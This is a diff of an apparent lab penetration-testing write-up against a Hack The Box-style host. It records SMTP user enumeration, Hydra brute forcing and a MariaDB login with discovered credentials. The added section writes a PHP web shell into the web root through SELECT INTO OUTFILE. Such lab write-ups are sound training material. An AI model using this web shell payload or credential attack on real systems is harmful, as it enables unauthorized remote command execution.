@@ -49,7 +49,7 @@ PORT     STATE SERVICE
 
 ```
 
-**SMTP USER ENUMERATION**
+
 
 **Credentials Found:**
 
@@ -68,6 +68,8 @@ Password
 987654321
 ```
 
+
+**SMTP USER ENUMERATION**
 ```
 smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.54.68                                   
 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -111,3 +113,30 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-08 22:50:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-08 22:50:35
 
 ```
+
+**MySQL Login**
+
+Using the credentials found, login into mysql
+```
+mysql -h inlanefreight.htb -u fiona -p
+
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 8
+Server version: 10.4.24-MariaDB mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
+
+**mysql database**
+
+- use the mysql database
+- create a file
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
